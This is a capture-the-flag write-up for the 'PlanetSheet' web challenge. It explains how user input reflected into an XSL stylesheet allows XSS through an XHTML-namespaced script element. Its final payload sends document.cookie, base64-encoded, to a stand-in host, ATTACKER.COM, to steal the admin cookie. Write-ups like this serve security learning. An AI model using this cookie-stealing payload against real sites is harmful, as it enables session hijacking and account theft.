# PlanetSheet

> Let's start by warming a little bit! I love planets and I hate sheets so I made this website to show my favorite planets. Flag is in admin cookie.\
> **Link:** http://20.233.9.240:1337

In this challenge our input is reflected into an [XSL document](https://developer.mozilla.org/en-US/docs/Web/XSLT). For instance:

```markup
<?xml version="1.0" encoding="UTF-8"?>
<xsl:stylesheet version="1.0"
xmlns:xsl="http://www.w3.org/1999/XSL/Transform">
<xsl:template match="/">
  <html>
  <body>
    <h2>Planets</h2>
    <p>
OUR INPUT    <xsl:for-each select="catalog/cd">
      <xsl:value-of select="title"/>
      <xsl:if test="position() < last()-1">
        <xsl:text>, </xsl:text>
      </xsl:if>
      <xsl:if test="position()=last()-1">
        <xsl:text>, and </xsl:text>
      </xsl:if>
      <xsl:if test="position()=last()">
        <xsl:text>!</xsl:text>
      </xsl:if>
    </xsl:for-each>
    </p>
  </body>
  </html>
</xsl:template>

</xsl:stylesheet>
```

When rendered in the browser, this yields an error.

![](<../../.gitbook/assets/Screenshot 2022-04-11 at 11.59.45 AM.png>)

Since the `Content-Type` is `text/xsl`, we can use `<x:script>` to perform XSS ([source](https://github.com/BlackFan/content-type-research/blob/master/XSS.md)).

The final payload was

```xml
<x:script xmlns:x="http://www.w3.org/1999/xhtml" nonce="Y8Ret8N5CPXrSG">fetch(`http://ATTACKER.COM/${btoa(document.cookie)}`)</x:script>
```
